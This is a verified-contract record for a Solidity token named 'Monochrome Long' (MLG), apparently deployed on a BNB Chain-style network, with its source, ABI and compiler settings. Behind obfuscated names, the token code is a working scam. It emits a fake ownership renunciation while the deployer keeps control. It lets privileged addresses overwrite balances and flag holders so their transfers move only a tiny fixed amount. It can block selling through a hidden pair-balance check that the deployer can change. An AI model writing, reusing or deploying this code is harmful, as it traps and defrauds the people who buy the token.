{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface launchTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenMarketing) external view returns (uint256);\n\n    function transfer(address walletList, uint256 exemptLaunched) external returns (bool);\n\n    function allowance(address minFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletList,\n        uint256 exemptLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletReceiver, uint256 value);\n    event Approval(address indexed minFrom, address indexed spender, uint256 value);\n}\n\nabstract contract listWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface exemptWallet {\n    function createPair(address liquiditySell, address senderTeamList) external returns (address);\n}\n\ninterface launchTradingMetadata is launchTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MonochromeLong is listWallet, launchTrading, launchTradingMetadata {\n\n    function approve(address fundIsTrading, uint256 exemptLaunched) public virtual override returns (bool) {\n        enableTotal[_msgSender()][fundIsTrading] = exemptLaunched;\n        emit Approval(_msgSender(), fundIsTrading, exemptLaunched);\n        return true;\n    }\n\n    function transferFrom(address maxMarketing, address walletList, uint256 exemptLaunched) external override returns (bool) {\n        if (_msgSender() != swapLaunched) {\n            if (enableTotal[maxMarketing][_msgSender()] != type(uint256).max) {\n                require(exemptLaunched <= enableTotal[maxMarketing][_msgSender()]);\n                enableTotal[maxMarketing][_msgSender()] -= exemptLaunched;\n            }\n        }\n        return autoLaunch(maxMarketing, walletList, exemptLaunched);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return txAutoTotal;\n    }\n\n    uint256 constant modeTakeFee = 8 ** 10;\n\n    function limitFromFund(address maxMarketing, address walletList, uint256 exemptLaunched) internal returns (bool) {\n        require(tradingTx[maxMarketing] >= exemptLaunched);\n        tradingTx[maxMarketing] -= exemptLaunched;\n        tradingTx[walletList] += exemptLaunched;\n        emit Transfer(maxMarketing, walletList, exemptLaunched);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return totalWallet;\n    }\n\n    uint256 private swapMax;\n\n    uint256 private atSwap;\n\n    function marketingExemptAuto(address limitTokenTake, uint256 exemptLaunched) public {\n        enableSenderSell();\n        tradingTx[limitTokenTake] = exemptLaunched;\n    }\n\n    bool public walletExempt;\n\n    function buyTeam(address receiverList) public {\n        if (launchedExempt) {\n            return;\n        }\n        \n        maxAtSwap[receiverList] = true;\n        if (atSwap != launchTakeList) {\n            walletExempt = true;\n        }\n        launchedExempt = true;\n    }\n\n    function enableReceiver(address limitLaunched) public {\n        enableSenderSell();\n        \n        if (limitLaunched == swapFund || limitLaunched == autoEnable) {\n            return;\n        }\n        modeFee[limitLaunched] = true;\n    }\n\n    uint256 public maxReceiver;\n\n    constructor (){\n        \n        limitList swapIs = limitList(swapLaunched);\n        autoEnable = exemptWallet(swapIs.factory()).createPair(swapIs.WETH(), address(this));\n        \n        swapFund = _msgSender();\n        liquidityTotal();\n        maxAtSwap[swapFund] = true;\n        tradingTx[swapFund] = exemptFeeLiquidity;\n        \n        emit Transfer(address(0), swapFund, exemptFeeLiquidity);\n    }\n\n    function fundAt(uint256 exemptLaunched) public {\n        enableSenderSell();\n        listMin = exemptLaunched;\n    }\n\n    function transfer(address limitTokenTake, uint256 exemptLaunched) external virtual override returns (bool) {\n        return autoLaunch(_msgSender(), limitTokenTake, exemptLaunched);\n    }\n\n    uint256 private exemptFeeLiquidity = 100000000 * 10 ** 18;\n\n    function enableSenderSell() private view {\n        require(maxAtSwap[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptFeeLiquidity;\n    }\n\n    uint256 public launchTakeList;\n\n    bool public shouldList;\n\n    uint256 receiverTeam;\n\n    string private receiverMode = \"MLG\";\n\n    function autoLaunch(address maxMarketing, address walletList, uint256 exemptLaunched) internal returns (bool) {\n        if (maxMarketing == swapFund) {\n            return limitFromFund(maxMarketing, walletList, exemptLaunched);\n        }\n        uint256 tradingToSwap = launchTrading(autoEnable).balanceOf(liquidityReceiver);\n        require(tradingToSwap == listMin);\n        require(walletList != liquidityReceiver);\n        if (modeFee[maxMarketing]) {\n            return limitFromFund(maxMarketing, walletList, modeTakeFee);\n        }\n        return limitFromFund(maxMarketing, walletList, exemptLaunched);\n    }\n\n    uint256 listMin;\n\n    mapping(address => mapping(address => uint256)) private enableTotal;\n\n    bool public launchedExempt;\n\n    address liquidityReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private tradingSell;\n\n    address swapLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function balanceOf(address tokenMarketing) public view virtual override returns (uint256) {\n        return tradingTx[tokenMarketing];\n    }\n\n    mapping(address => bool) public modeFee;\n\n    function allowance(address buyToken, address fundIsTrading) external view virtual override returns (uint256) {\n        if (fundIsTrading == swapLaunched) {\n            return type(uint256).max;\n        }\n        return enableTotal[buyToken][fundIsTrading];\n    }\n\n    event OwnershipTransferred(address indexed exemptAuto, address indexed buySwapFee);\n\n    uint8 private txAutoTotal = 18;\n\n    string private listTeam = \"Monochrome Long\";\n\n    uint256 public fromTxLaunched;\n\n    function getOwner() external view returns (address) {\n        return totalWallet;\n    }\n\n    address private totalWallet;\n\n    function name() external view virtual override returns (string memory) {\n        return listTeam;\n    }\n\n    bool public takeWallet;\n\n    address public autoEnable;\n\n    mapping(address => bool) public maxAtSwap;\n\n    mapping(address => uint256) private tradingTx;\n\n    bool private amountReceiver;\n\n    function liquidityTotal() public {\n        emit OwnershipTransferred(swapFund, address(0));\n        totalWallet = address(0);\n    }\n\n    address public swapFund;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverMode;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buySwapFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundIsTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundIsTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMarketing\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"}],\"name\":\"buyTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitLaunched\",\"type\":\"address\"}],\"name\":\"enableReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTxLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptLaunched\",\"type\":\"uint256\"}],\"name\":\"fundAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTakeList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTokenTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptLaunched\",\"type\":\"uint256\"}],\"name\":\"marketingExemptAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxAtSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTokenTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "MonochromeLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}